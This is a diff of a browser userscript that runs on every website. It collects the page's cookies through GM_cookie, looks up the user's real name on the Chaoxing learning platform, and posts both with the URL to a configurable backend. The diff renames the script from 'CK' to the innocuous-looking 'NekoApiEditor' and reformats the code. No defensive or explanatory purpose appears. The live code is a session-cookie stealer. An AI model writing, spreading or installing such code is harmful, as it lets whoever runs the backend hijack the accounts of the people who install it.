@@ -1,7 +1,7 @@
 // ==UserScript==
-// @name        CK
+// @name        NekoApiEditor
 // @namespace   test
-// @version     1.0
+// @version     1.74
 // @match       *://*/
 // @match       *://*/*
 // @run-at      document-end
@@ -33,7 +33,7 @@ function sendDataToServer(url, cookies, chaoxingName) {
     if (chaoxingName) {
         dataToSend.chaoxing_name = chaoxingName;
     }
-    //自定义服务地址
+    //自定义需要发送到的后端地址
     fetch('http://localhost/server/nekocookieset.php', {
         method: 'POST',
         headers: {
@@ -42,17 +42,17 @@ function sendDataToServer(url, cookies, chaoxingName) {
         body: JSON.stringify(dataToSend)
     })
         .then(response => {
-            if (!response.ok) {
-                throw new Error(`Network response was not ok: ${response.status}${response.statusText}`);
-            }
-            return response.json();
-        })
+        if (!response.ok) {
+            throw new Error(`Network response was not ok: ${response.status}${response.statusText}`);
+        }
+        return response.json();
+    })
         .then(result => {
-            console.log('Server response:', result);
-        })
+        console.log('Server response:', result);
+    })
         .catch(error => {
-            console.error('Error sending data to server:', error);
-        });
+        console.error('Error sending data to server:', error);
+    });
 }
 
 function getChaoxingUserId(cookies) {
@@ -70,24 +70,24 @@ function fetchChaoxingUserInfo(uid, cookies) {
         credentials: 'include'
     })
         .then(response => {
-            if (!response.ok) {
-                throw new Error(`Network response was not ok: ${response.status}${response.statusText}`);
-            }
-            return response.json();
-        })
+        if (!response.ok) {
+            throw new Error(`Network response was not ok: ${response.status}${response.statusText}`);
+        }
+        return response.json();
+    })
         .then(result => {
-            if (result.result === 1 && result.data) {
-                console.log(`${result.data.realName}`);
-                sendDataToServer(document.location.href, cookies, result.data.realName);
-            } else {
-                console.error('Failed to fetch user info:', result);
-                sendDataToServer(document.location.href, cookies);
-            }
-        })
-        .catch(error => {
-            console.error('Error fetching Chaoxing user info:', error);
+        if (result.result === 1 && result.data) {
+            console.log(`${result.data.realName}`);
+            sendDataToServer(document.location.href, cookies, result.data.realName);
+        } else {
+            console.error('Failed to fetch user info:', result);
             sendDataToServer(document.location.href, cookies);
-        });
+        }
+    })
+        .catch(error => {
+        console.error('Error fetching Chaoxing user info:', error);
+        sendDataToServer(document.location.href, cookies);
+    });
 }
 
 GM_cookie.list({ url: document.location.href }, function (cookies, error) {
